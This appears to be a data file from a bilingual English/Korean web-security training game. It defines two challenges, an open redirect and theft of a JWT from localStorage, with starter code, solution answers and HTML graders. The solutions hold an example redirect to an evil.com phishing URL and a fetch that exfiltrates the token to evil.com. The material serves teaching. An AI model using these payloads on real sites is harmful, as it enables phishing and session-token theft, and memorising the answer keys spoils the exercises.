        title: 'Stage 8: Open Redirect',
        titleKo: 'Stage 8: Open Redirect',
        subtitle: 'Unvalidated Redirects',
        subtitleKo: '검증 없는 리다이렉트',
        description: 'Learn how attackers abuse redirect parameters to send users to phishing sites.',
        descriptionKo: '리다이렉트 파라미터가 악용되어 피싱 사이트로 유도되는 원리를 이해합니다.',
        problems: [
            {
                id: 'open-redirect-1',
                title: 'Bypass Redirect Validation',
                titleKo: '리다이렉트 우회',
                description: 'Manipulate the next parameter to redirect the user to an external site.',
                descriptionKo: 'next 파라미터를 조작해 외부 사이트로 리다이렉트하세요.',
                initialCode: `// Problem 1: Open Redirect
// The app redirects after login using ?next=...
// Provide a next value that sends the user to an attacker-controlled site.

export default function getPayload() {
  return "/dashboard";
}`,
                solutionCode: 'return "https://evil.com/phish";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui; padding: 2rem; background: #0f172a; color: #e2e8f0; }
                        .box { background: #1e293b; padding: 1rem; border-radius: 0.5rem; }
                    </style>
                    </head>
                    <body>
                    <h2>Login Redirect</h2>
                    <div class="box">Redirecting to: <span id="next">/dashboard</span></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const allowlistHost = 'app.local';
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const next = String(module.default()).trim();
                                    document.getElementById('next').textContent = next || '(empty)';
                                    const looksLikeUrl = /^(https?:)?\\/\\//i.test(next);
                                    const isExternal = looksLikeUrl && !next.includes(allowlistHost);
                                    
                                    if (isExternal) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Not an external redirect.' }, '*');
                                    }
                                }
                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-9',
        title: 'Stage 9: Web Storage Security',
        titleKo: 'Stage 9: Web Storage Security',
        subtitle: 'LocalStorage Token Theft',
        subtitleKo: 'LocalStorage 토큰 탈취',
        description: 'Learn why storing sensitive tokens in Web Storage can be risky.',
        descriptionKo: '민감 토큰을 Web Storage에 저장하는 위험성을 이해합니다.',
        problems: [
            {
                id: 'storage-1',
                title: 'Steal the JWT',
                titleKo: 'JWT 탈취',
                description: 'Extract a JWT from localStorage and exfiltrate it to an attacker endpoint.',
                descriptionKo: 'localStorage의 JWT를 읽어 공격자 서버로 탈취하세요.',
                initialCode: `// Problem 1: Web Storage Security
// The app stores a JWT in localStorage under "token".
// Write JS to read it and exfiltrate it (e.g., via fetch to https://evil.com).

export default function getPayload() {
  return "localStorage.getItem('token')";
}`,
                solutionCode: "return `fetch('https://evil.com/steal?token=' + encodeURIComponent(localStorage.getItem('token')))`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui; padding: 2rem; background: #fefce8; }
                    </style>
                    </head>
                    <body>
                    <h2>Single Page App</h2>
                    <script type="module">
                        localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.demo.payload');
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    const readsToken = /localStorage\\.getItem\\(['\\"]token['\\"]\\)/.test(payload);
                                    const exfil = /(fetch|Image|location)\\s*\\(/.test(payload) && /evil\\.com/.test(payload);
                                    
                                    if (readsToken && exfil) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Missing token read or exfiltration.' }, '*');
                                    }
                                }
                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    }
];
